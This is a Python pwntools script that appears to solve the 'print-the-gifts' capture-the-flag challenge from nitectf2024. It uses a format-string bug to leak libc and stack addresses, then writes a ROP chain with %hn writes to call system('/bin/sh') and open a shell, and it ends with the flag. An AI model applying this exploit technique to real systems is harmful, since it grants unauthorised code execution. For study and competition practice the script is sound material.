import argparse
import sys
sys.path.append('/home/coraline/CTF/pwn-dev/scripts/')
from pwn import *
from pwnfast import Pwn

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chall_patched'
libc = ELF('./libc.so.6')
conn = 'print-the-gifts.chals.nitectf2024.live 1337'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn=conn) if args.r else Pwn(PROG, debug=args.d, pie_base=0x555555554000)

def mywrite(addr, val):
    fst = (val >> (8*4)) & 0xffff
    snd = (val >> (4*4)) & 0xffff
    thd = val & 0xffff
    for i, w in enumerate([thd, snd, fst]):
        r.sla(b'n:', b'y')
        pay = f'%{w}c%10$hn'
        pay += 'a' * (16-len(pay))
        pay = pay.encode()
        pay += p64(addr+(i*2))
        r.sla(b'>', pay)


pay = '.'.join([f'%{i}$llx' for i in (23,27)])
r.sla(b'>', pay)

r.ru(b'you a ')
libc_leak = int(r.ru(b'.')[:-1], 16)
stack_leak = int(r.rl().strip(), 16)
log.info('Libc leak: ' + hex(libc_leak))
log.info('Stack leak: ' + hex(stack_leak))

libc.address = libc_leak - 0x2724a
ret_addr = stack_leak - 0x110
log.info('Libc base: ' + hex(libc.address))
log.info('Ret addr: ' + hex(ret_addr))

# ROP 1: pop rdi <- /bin/sh
pop_rdi = libc.address + 0x277e5
mywrite(ret_addr, pop_rdi)

binsh = libc.address + 0x196031
mywrite(ret_addr+8, binsh)

# ROP 2: pop rsi <- 0
pop_rsi = libc.address + 0x28f99
mywrite(ret_addr+(8*2), pop_rsi)

curr = ret_addr+(8*3)
r.sla(b'n:', b'y')
pay = f'%10$lln'
pay += 'a' * (16-len(pay))
pay = pay.encode()
pay += p64(curr)
r.sla(b'>', pay)

# ROP 3: ret for 16 byte aligned
ret = libc.address + 0x26e99
mywrite(ret_addr+(8*4), ret)

# ROP 4: system
mywrite(ret_addr+(8*5), libc.sym['system'])

r.sla(b'n:', b'n')
r.interactive()
# nite{0nLy_n4ugHty_k1d5_Use_%n}